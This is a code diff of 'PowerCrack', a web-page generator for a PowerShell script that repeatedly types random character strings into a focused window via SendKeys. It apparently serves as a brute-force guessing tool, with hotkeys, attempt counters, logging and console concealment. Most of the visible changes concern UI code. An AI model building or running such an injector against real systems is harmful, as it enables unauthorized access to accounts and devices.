-  /* FIX #5: SystemSounds replaces deprecated [console]::beep */
-  const beepStart = state.beep ? 'try{[System.Media.SystemSounds]::Asterisk.Play()}catch{};' : '';
-  const beepStop  = state.beep ? 'try{[System.Media.SystemSounds]::Hand.Play()}catch{};' : '';
+  const beepStart = state.beep ? 'BS;' : '';
+  const beepStop  = state.beep ? 'BE;' : '';
 
   const loop =
     'while($true){' +
-      'if(' + startCond + '){if(-not $run){$run=$true;Write-Host \'[STARTED] Script started\' -ForegroundColor Green;' + beepStart + '};Start-Sleep -Milliseconds 420};' +
-      'if(' + stopCond  + '){if($run){$run=$false;Write-Host (\'[STOPPED] Script stopped. Attempts: \'+$n) -ForegroundColor Red;' + beepStop + '};Start-Sleep -Milliseconds 420};' +
+      'if(' + startCond + '){if(-not $run){$run=$true;$n=0;$dup=0;$err=0;Write-Host \'\';Write-Host \'[STARTED] Injector armed. Awaiting target focus...\' -ForegroundColor Green;Write-PCLog \'--- START ---\';' + beepStart + '};Start-Sleep -Milliseconds 420};' +
+      'if(' + stopCond  + '){if($run){$run=$false;Write-Host \'\';Write-Host (\'[STOPPED] Injector disarmed. Attempts: \'+$n+\' | Dupes: \'+$dup+\' | Errors: \'+$err) -ForegroundColor Red;Write-PCLog (\'--- STOP  --- attempts=\'+$n+\' dupes=\'+$dup+\' errors=\'+$err);' + beepStop + '};Start-Sleep -Milliseconds 420};' +
       'if($run){' + b.join(';') + '};' +
       'Start-Sleep -Milliseconds 25' +
     '}';
@@ -1022,9 +982,6 @@ function buildScript(){
   return s.join(';');
 }
 
-/* =========================================================
-   SAMPLE STRING GENERATOR
-   ========================================================= */
 function generateSample(){
   const pool = buildCharset();
   const minL = Math.max(1, parseInt(state.minLen, 10) || 1);
@@ -1032,7 +989,6 @@ function generateSample(){
   const len  = minL + Math.floor(Math.random() * (maxL - minL + 1));
   let s = '';
   for (let i = 0; i < len; i++) s += pool[Math.floor(Math.random() * pool.length)];
-
   if (state.spaceMode === 'random' && state.spaceCount > 0){
     for (let j = 0; j < state.spaceCount; j++){
       const pos = Math.floor(Math.random() * (s.length + 1));
@@ -1053,13 +1009,9 @@ function generateSample(){
     const sortedDesc = positions.slice().sort((a,b) => b - a);
     for (const p of sortedDesc){ if (p <= s.length) s = s.slice(0, p) + ' ' + s.slice(p); }
   }
-
   return sanitize(state.prefix || '') + s + sanitize(state.suffix || '');
 }
 
-/* =========================================================
-   CARD DEFINITIONS
-   ========================================================= */
 const cardDefs = [
   { id:'intro', type:'intro', icon:'fa-bolt', title:'PowerCrack',
     desc:'// interactive payload generator for authorized penetration testing\n// define the character space, calibrate the injection vector,\n// and compile a single-line PowerShell payload.' },
@@ -1081,14 +1033,14 @@ const cardDefs = [
   { id:'specials', type:'toggle', key:'specials', icon:'fa-at',
     chapter:{ num:'I', name:'Character Inventory' },
     title:'Symbol Vectors',
-    desc:'Punctuation and special symbols. Expands the search space significantly.',
+    desc:'Punctuation and symbols, excluding curly braces (SendKeys cannot reliably inject them).',
     onLabel:'Include', offLabel:'Exclude' },
   { id:'custom', type:'text', key:'custom', icon:'fa-plus',
     chapter:{ num:'I', name:'Character Inventory' },
     title:'Supplementary Vectors',
-    desc:'Additional characters to append to the pool. Useful for target-specific alphabets.',
+    desc:'Additional characters to append to the pool.',
     placeholder:'e.g. _-.@#',
-    hint:'leave empty to skip · concatenated after the standard pools' },
+    hint:'<code>{</code> and <code>}</code> are auto-filtered — they break SendKeys on all Windows builds' },
   { id:'minLen', type:'stepper', key:'minLen', icon:'fa-arrow-down-short-wide',
     chapter:{ num:'II', name:'Payload Geometry' },
     title:'Minimum Length',
@@ -1161,13 +1113,19 @@ const cardDefs = [
   { id:'minimize', type:'toggle', key:'minimize', icon:'fa-window-minimize',
     chapter:{ num:'IV', name:'Runtime Safeguards' },
     title:'Console Concealment',
-    desc:'Auto-minimize the console window shortly after launch.',
+    desc:'Auto-minimize the console window after a 3-second countdown so you can focus the target.',
     onLabel:'Enable', offLabel:'Disable' },
   { id:'beep', type:'toggle', key:'beep', icon:'fa-volume-high',
     chapter:{ num:'IV', name:'Runtime Safeguards' },
     title:'Audio Telemetry',
-    desc:'Audible confirmation on arm and disarm. Uses SystemSounds for maximum terminal compatibility.',
+    desc:'Audible confirmation on arm and disarm. Uses a 3-tier fallback chain for maximum compatibility.',
     onLabel:'Enable', offLabel:'Disable' },
+  { id:'logFile', type:'text', key:'logFile', icon:'fa-file-lines',
+    chapter:{ num:'IV', name:'Runtime Safeguards' },
+    title:'Log File Path',
+    desc:'Optional. Relative paths resolve to the current directory. Parent dir auto-created before every write. Rotates at 10 MB.',
+    placeholder:'C:\\temp\\powercrack.log',
+    hint:'bare filename like <code>injector.log</code> is also accepted — resolved to current working directory' },
   { id:'maxAttempts', type:'stepper', key:'maxAttempts', icon:'fa-flag-checkered',
     chapter:{ num:'IV', name:'Runtime Safeguards' },
     title:'Attempt Ceiling',
@@ -1183,16 +1141,12 @@ const cardDefs = [
     desc:'Simulated environment. Click the field, then press your start bind to observe injector behavior.' }
 ];
 
-/* =========================================================
-   HELPERS
-   ========================================================= */
 function el(tag, cls, html){
   const e = document.createElement(tag);
   if (cls) e.className = cls;
   if (html !== undefined) e.innerHTML = html;
   return e;
 }
-
 function bump(el){
   el.style.transition = 'transform .16s ease, color .16s ease';
   el.style.transform = 'scale(1.1)';
@@ -1200,21 +1154,14 @@ function bump(el){
   setTimeout(() => { el.style.transform = 'scale(1)'; el.style.color = ''; }, 160);
 }
 
-/* =========================================================
-   CUSTOM DROPDOWN
-   ========================================================= */
 function buildCustomSelect(options, currentValue, onChange){
   const wrap = el('div', 'custom-select');
   const trigger = document.createElement('button');
-  trigger.type = 'button';
-  trigger.className = 'cs-trigger';
+  trigger.type = 'button'; trigger.className = 'cs-trigger';
   const valueSpan = el('span', 'cs-value');
   const chevron = el('i', 'cs-chevron fa-solid fa-chevron-down');
-  trigger.appendChild(valueSpan);
-  trigger.appendChild(chevron);
-
+  trigger.appendChild(valueSpan); trigger.appendChild(chevron);
   const menu = el('div', 'cs-menu');
-
   function setValue(val){
     const opt = options.find(o => o.value === val);
     valueSpan.textContent = opt ? opt.label : '';
@@ -1223,7 +1170,6 @@ function buildCustomSelect(options, currentValue, onChange){
     });
   }
   setValue(currentValue);
-
   options.forEach(opt => {
     const item = el('div', 'cs-option', opt.label);
     item.dataset.value = opt.value;
@@ -1235,7 +1181,6 @@ function buildCustomSelect(options, currentValue, onChange){
     });
     menu.appendChild(item);
   });
-
   trigger.addEventListener('click', (e) => {
     e.stopPropagation();
     document.querySelectorAll('.custom-select.open').forEach(s => {
@@ -1243,30 +1188,21 @@ function buildCustomSelect(options, currentValue, onChange){
     });
     wrap.classList.toggle('open');
   });
-
-  wrap.appendChild(trigger);
-  wrap.appendChild(menu);
+  wrap.appendChild(trigger); wrap.appendChild(menu);
   return wrap;
 }
-
 document.addEventListener('click', () => {
   document.querySelectorAll('.custom-select.open').forEach(s => s.classList.remove('open'));
 });
 
-/* =========================================================
-   TYPEWRITER
-   ========================================================= */
 let activeTypeTimer = null;
-
 function typeInto(el, text, speed){
   if (activeTypeTimer){ clearInterval(activeTypeTimer); activeTypeTimer = null; }
-  el.textContent = '';
-  el.classList.add('typing');
+  el.textContent = ''; el.classList.add('typing');
   let i = 0;
   const timer = setInterval(() => {
     if (i >= text.length){
-      clearInterval(timer);
-      el.classList.remove('typing');
+      clearInterval(timer); el.classList.remove('typing');
       if (activeTypeTimer === timer) activeTypeTimer = null;
       return;
     }
@@ -1275,9 +1211,6 @@ function typeInto(el, text, speed){
   activeTypeTimer = timer;
 }
 
-/* =========================================================
-   CARD BUILDERS
-   ========================================================= */
 function buildChapterTag(def){
   if (!def.chapter) return null;
   return el('div', 'chapter-tag',
@@ -1285,7 +1218,6 @@ function buildChapterTag(def){
     'CH.' + def.chapter.num + ' · ' + def.chapter.name
   );
 }
-
 function buildIcon(def){
   const wrap = el('div', 'card-icon-wrap');
   wrap.appendChild(el('div', 'card-icon',
@@ -1303,8 +1235,7 @@ function buildBody(def){
     const offLbl = el('span', 'toggle-label off', def.offLabel || 'Off');
     const onLbl  = el('span', 'toggle-label on',  def.onLabel  || 'On');
     const input  = document.createElement('input');
-    input.type = 'checkbox';
-    input.className = 'big-switch';
+    input.type = 'checkbox'; input.className = 'big-switch';
     input.checked = !!state[def.key];
     input.addEventListener('change', () => {
       state[def.key] = input.checked;
@@ -1315,7 +1246,6 @@ function buildBody(def){
     body.appendChild(wrap);
     return body;
   }
-
   if (def.type === 'stepper'){
     const wrap = el('div', 'stepper');
     const minusBtn = el('button', 'step-btn', '<i class="fa-solid fa-minus"></i>');
@@ -1325,7 +1255,6 @@ function buildBody(def){
     input.step = def.step || 1; input.value = state[def.key];
     const plusBtn = el('button', 'step-btn', '<i class="fa-solid fa-plus"></i>');
     const clamp = v => Math.max(def.min, Math.min(def.max, v));
-
     minusBtn.addEventListener('click', () => {
       const v = clamp((parseInt(input.value, 10) || 0) - (def.step || 1));
       input.value = v; state[def.key] = v; bump(input);
@@ -1342,13 +1271,11 @@ function buildBody(def){
       const v = clamp(parseInt(input.value, 10) || def.min);
       input.value = v; state[def.key] = v;
     });
-
     wrap.appendChild(minusBtn); wrap.appendChild(input); wrap.appendChild(plusBtn);
     body.appendChild(wrap);
     if (def.unit) body.appendChild(el('div', 'input-hint', def.unit));
     return body;
   }
-
   if (def.type === 'select'){
     const dropdown = buildCustomSelect(def.options, state[def.key], (val) => {
       state[def.key] = val;
@@ -1356,7 +1283,6 @@ function buildBody(def){
     body.appendChild(dropdown);
     return body;
   }
-
   if (def.type === 'spaceMode'){
     const randomWrap = el('div', 'conditional-reveal');
     randomWrap.style.display = state.spaceMode === 'random' ? 'block' : 'none';
@@ -1400,12 +1326,10 @@ function buildBody(def){
       patternWrap.style.display = val === 'pattern' ? 'block' : 'none';
       customWrap.style.display  = val === 'custom'  ? 'block' : 'none';
     });
-
     body.appendChild(dropdown); body.appendChild(randomWrap);
     body.appendChild(patternWrap); body.appendChild(customWrap);
     return body;
   }
-
   if (def.type === 'text'){
     const input = document.createElement('input');
     input.type = 'text'; input.className = 'nice-input';
@@ -1417,7 +1341,6 @@ function buildBody(def){
     if (def.hint) body.appendChild(el('div', 'input-hint', def.hint));
     return body;
   }
-
   if (def.type === 'hotkey'){
     const hk = state[def.key];
     const btn = el('div', 'hotkey-btn',
@@ -1445,7 +1368,6 @@ function buildBody(def){
     if (def.hint) body.appendChild(el('div', 'input-hint', def.hint));
     return body;
   }
-
   if (def.type === 'review'){
     const actSection = el('div', 'review-section');
     actSection.appendChild(el('div', 'review-label',
@@ -1481,42 +1403,34 @@ function buildBody(def){
     scrRow.appendChild(scrCopy); scrRow.appendChild(scrDl);
     scrSection.appendChild(scrRow);
     body.appendChild(scrSection);
-
     body.appendChild(el('div', 'input-hint',
       '// deployment ready · continue to sandbox verification'
     ));
     return body;
   }
-
   if (def.type === 'test'){
     const wrap = el('div', 'test-area');
-
     const statusRow = el('div', 'test-status-row');
     statusRow.id = 'testStatusRow';
     statusRow.appendChild(el('span', 'status-dot'));
     const statusText = el('span', 'status-text', 'standby');
     statusText.id = 'testStatus';
     statusRow.appendChild(statusText);
-
     const hint = el('span', 'status-hint');
     const startK = hkLabel(state.hkStart).split(' + ').map(k => '<kbd>' + k + '</kbd>').join('+');
     hint.innerHTML = 'arm: ' + startK;
     statusRow.appendChild(hint); wrap.appendChild(statusRow);
-
     const field = document.createElement('input');
     field.type = 'text'; field.className = 'test-field'; field.id = 'testField';
     field.readOnly = true;
     field.placeholder = '> click here, then press your start bind';
     wrap.appendChild(field);
-
     const log = el('div', 'test-log'); log.id = 'testLog';
     log.appendChild(el('div', 'test-log-empty', '// waiting for input stream...'));
     wrap.appendChild(log);
-
     body.appendChild(wrap);
     return body;
   }
-
   return body;
 }
 
@@ -1530,7 +1444,6 @@ function buildActions(def){
     actions.appendChild(back);
   }
   actions.appendChild(el('div', 'spacer'));
-
   const okLabel =
       def.type === 'intro'  ? 'Initialize'
     : def.type === 'review' ? 'Enter Sandbox'
@@ -1541,7 +1454,6 @@ function buildActions(def){
     : def.type === 'review' ? 'fa-flask'
     : def.type === 'test'   ? 'fa-rotate-left'
     :                         'fa-check';
-
   const ok = el('button', 'action-btn ok',
     '<i class="fa-solid ' + okIcon + '"></i> ' + okLabel
   );
@@ -1553,7 +1465,6 @@ function buildActions(def){
 function buildCard(def){
   const card = el('div', 'card');
   card.dataset.cardId = def.id;
-
   const chrome = el('div', 'titlebar');
   const lights = el('div', 'traffic-lights');
   const r = el('button', 'tl tl-red'); r.setAttribute('aria-label','close');
@@ -1561,20 +1472,17 @@ function buildCard(def){
   const g = el('button', 'tl tl-green'); g.setAttribute('aria-label','zoom');
   lights.appendChild(r); lights.appendChild(y); lights.appendChild(g);
   chrome.appendChild(lights);
-
   const title = el('div', 'titlebar-title');
   title.innerHTML =
     '<i class="fa-solid fa-terminal"></i>' +
     '<span class="path">PowerCrack — <b>~/' + def.id + '.ps1</b></span>';
   chrome.appendChild(title);
-
   const share = el('div', 'titlebar-share');
   share.innerHTML = '<i class="fa-solid fa-share-nodes"></i>';
   chrome.appendChild(share);
   card.appendChild(chrome);
 
   const content = el('div', 'terminal-content');
-
   const prompt = el('div', 'prompt-line');
   prompt.innerHTML =
     '<span class="user">zayan</span><span>@</span>' +
@@ -1583,10 +1491,8 @@ function buildCard(def){
     '<span class="dollar">$</span>' +
     '<span class="cmd">./configure --module ' + def.id + '</span>';
   content.appendChild(prompt);
-
   const chTag = buildChapterTag(def);
   if (chTag) content.appendChild(chTag);
-
   content.appendChild(buildIcon(def));
   content.appendChild(el('h2', 'card-title', def.title));
   const descEl = el('p', 'card-desc');
@@ -1594,14 +1500,10 @@ function buildCard(def){
   content.appendChild(descEl);
   content.appendChild(buildBody(def));
   content.appendChild(buildActions(def));
-
   card.appendChild(content);
   return card;
 }
 
-/* =========================================================
-   NAVIGATION
-   ========================================================= */
 let currentIndex = 0;
 const totalCards = cardDefs.length;
 const container = document.getElementById('cardContainer');
@@ -1610,14 +1512,11 @@ const progressFill = document.getElementById('progressFill');
 function showCard(index){
   const oldCard = container.querySelector('.card');
   if (oldCard) oldCard.remove();
-
   const def = cardDefs[index];
   const newCard = buildCard(def);
   container.appendChild(newCard);
-
   currentIndex = index;
   updateProgress();
-
   const descEl = newCard.querySelector('.card-desc');
   const descText = descEl.dataset.desc || '';
   if (activeTypeTimer){ clearInterval(activeTypeTimer); activeTypeTimer = null; }
@@ -1626,15 +1525,12 @@ function showCard(index){
       typeInto(descEl, descText, 11);
     }
   }, 180);
-
   if (def.type === 'test') initTestCard();
   else stopTest();
 }
-
 function updateProgress(){
   progressFill.style.width = (currentIndex / (totalCards - 1)) * 100 + '%';
 }
-
 function goNext(){
   if (currentIndex < totalCards - 1) showCard(currentIndex + 1);
   else showCard(0);
@@ -1662,7 +1558,6 @@ function confirmAndAdvance(){
     }, 300);
   } else { goNext(); }
 }
-
 document.addEventListener('keydown', e => {
   const tag = e.target.tagName;
   if (tag === 'INPUT' || tag === 'SELECT' || tag === 'TEXTAREA') return;
@@ -1674,13 +1569,9 @@ document.addEventListener('keydown', e => {
   }
 });
 
-/* =========================================================
-   CLIPBOARD / TOAST
-   ========================================================= */
 const toast = document.getElementById('toast');
 const toastMsg = document.getElementById('toastMsg');
 let toastTimer = null;
-
 function showToast(msg, isWarn){
   toastMsg.textContent = msg;
   toast.classList.toggle('warn', !!isWarn);
@@ -1688,31 +1579,22 @@ function showToast(msg, isWarn){
   clearTimeout(toastTimer);
   toastTimer = setTimeout(() => toast.classList.remove('show'), 2400);
 }
-
 async function copyText(text, msg){
   try {
     await navigator.clipboard.writeText(text);
     showToast(msg);
   } catch (err){
     const ta = document.createElement('textarea');
-    ta.value = text;
-    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
     document.body.appendChild(ta); ta.select();
     try { document.execCommand('copy'); showToast(msg); }
     catch (e2){ showToast('copy failed', true); }
     document.body.removeChild(ta);
   }
 }
-
-/* =========================================================
-   DOWNLOAD AS .ps1 — FORCE CORRECT MIME + UTF-8 BOM
-   ========================================================= */
 function downloadScript(){
   const script = buildScript();
-  // UTF-8 BOM ensures Windows PowerShell 5.1 reads the file as UTF-8.
   const BOM = '\uFEFF';
-  // application/octet-stream forces binary download and preserves the
-  // .ps1 extension in Chrome, Edge, Firefox, and Safari.
   const blob = new Blob([BOM + script], { type: 'application/octet-stream' });
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
@@ -1730,18 +1612,13 @@ function downloadScript(){
   showToast('powercrack.ps1 exported');
 }
 
-/* =========================================================
-   TEST MODE
-   ========================================================= */
 let testRunning = false;
 let testTimers = [];
 let testAttemptN = 0;
-
 function clearTestTimers(){
   testTimers.forEach(t => { clearTimeout(t); clearInterval(t); });
   testTimers = [];
 }
-
 function initTestCard(){
   const field = document.getElementById('testField');
   const log = document.getElementById('testLog');
@@ -1755,7 +1632,6 @@ function initTestCard(){
     field.dataset.bound = '1';
   }
 }
-
 function updateStatus(running){
   const row = document.getElementById('testStatusRow');
   const txt = document.getElementById('testStatus');
@@ -1763,7 +1639,6 @@ function updateStatus(running){
   row.classList.toggle('running', running);
   txt.textContent = running ? 'active' : 'standby';
 }
-
 function logAttempt(s){
   const log = document.getElementById('testLog');
   if (!log) return;
@@ -1777,13 +1652,11 @@ function logAttempt(s){
   while (log.children.length > 40) log.removeChild(log.firstChild);
   log.scrollTop = log.scrollHeight;
 }
-
 function startTest(){
   if (testRunning) return;
   const field = document.getElementById('testField');
   if (!field) return;
   testRunning = true; updateStatus(true);
-
   function tick(){
     if (!testRunning) return;
     const s = generateSample();
@@ -1815,11 +1688,9 @@ function startTest(){
   }
   tick();
 }
-
 function stopTest(){
   testRunning = false; clearTestTimers(); updateStatus(false);
 }
-
 function matchesHotkey(e, hk){
   if (!!hk.ctrl  !== e.ctrlKey)  return false;
   if (!!hk.shift !== e.shiftKey) return false;
@@ -1827,16 +1698,12 @@ function matchesHotkey(e, hk){
   if (!!hk.win   !== e.metaKey)  return false;
   return e.code === hk.code;
 }
-
 document.addEventListener('keydown', e => {
   if (cardDefs[currentIndex].type !== 'test') return;
   if (matchesHotkey(e, state.hkStart)){ e.preventDefault(); startTest(); }
   else if (matchesHotkey(e, state.hkStop)){ e.preventDefault(); stopTest(); }
 });
 
-/* =========================================================
-   SPLASH SEQUENCE
-   ========================================================= */
 (function runSplash(){
   const splash = document.getElementById('splash');
   const byEl = document.getElementById('splashBy');
@@ -1844,27 +1711,22 @@ document.addEventListener('keydown', e => {
   const mottoEl = document.getElementById('splashMotto');
   let appStarted = false;
   let splashClosed = false;
-
   function typeString(el, text, speed, cb){
     el.classList.add('typing');
     let i = 0;
     const timer = setInterval(() => {
       if (i >= text.length){
-        clearInterval(timer);
-        el.classList.remove('typing');
+        clearInterval(timer); el.classList.remove('typing');
         if (cb) cb();
         return;
       }
       el.textContent += text[i++];
     }, speed);
   }
-
   function initAppOnce(){
     if (appStarted) return;
-    appStarted = true;
-    showCard(0);
+    appStarted = true; showCard(0);
   }
-
   function closeSplash(){
     if (splashClosed) return;
     splashClosed = true;
@@ -1872,14 +1734,12 @@ document.addEventListener('keydown', e => {
     initAppOnce();
     setTimeout(() => { splash.style.display = 'none'; }, 850);
   }
-
   setTimeout(() => typeString(byEl, '// MADE BY', 55), 1400);
   setTimeout(() => typeString(nameEl, 'ZAYAN CODER', 80), 2000);
   setTimeout(() => typeString(mottoEl, 'only for the people who dare for it', 30), 3100);
   setTimeout(closeSplash, 5600);
-
   splash.addEventListener('click', closeSplash);
 })();
 </script>
 </body>
-  </html>
+</html>
